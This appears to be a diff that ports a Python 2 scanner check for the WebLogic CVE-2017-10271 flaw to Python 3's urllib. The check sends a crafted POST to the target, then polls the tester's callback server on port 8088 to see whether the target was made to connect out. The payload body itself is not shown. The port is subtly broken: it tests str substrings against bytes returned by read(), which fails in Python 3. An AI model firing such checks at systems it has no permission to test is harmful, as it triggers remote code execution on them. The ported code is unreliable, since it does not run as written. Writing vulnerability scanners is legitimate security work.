@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import re
 import random
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import socket
 from time import sleep
 
@@ -76,15 +76,15 @@ def check(ip, port, timeout = 10):
                 ''' %(test_str, server_ip)
     for url in check_url:
         target_url = 'http://'+ip+':'+str(port)+url.strip()
-        req = urllib2.Request(url=target_url, headers=heads)
-        if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
-                req = urllib2.Request(url=target_url, data=post_str, headers=heads)
+        req = urllib.request.Request(url=target_url, headers=heads)
+        if 'Web Services' in urllib.request.urlopen(req, timeout=timeout).read():
+                req = urllib.request.Request(url=target_url, data=post_str, headers=heads)
                 try:
-                    urllib2.urlopen(req, timeout=timeout).read()
-                except urllib2.URLError:
+                    urllib.request.urlopen(req, timeout=timeout).read()
+                except urllib.error.URLError:
                     pass
                 sleep(2)
-                check_result = urllib2.urlopen("http://%s:8088/%s" %(server_ip, test_str), timeout=timeout).read()
+                check_result = urllib.request.urlopen("http://%s:8088/%s" %(server_ip, test_str), timeout=timeout).read()
                 if "YES" in check_result:
                     security_hole(ip + ' has CVE-2017-10271. ')
         else:
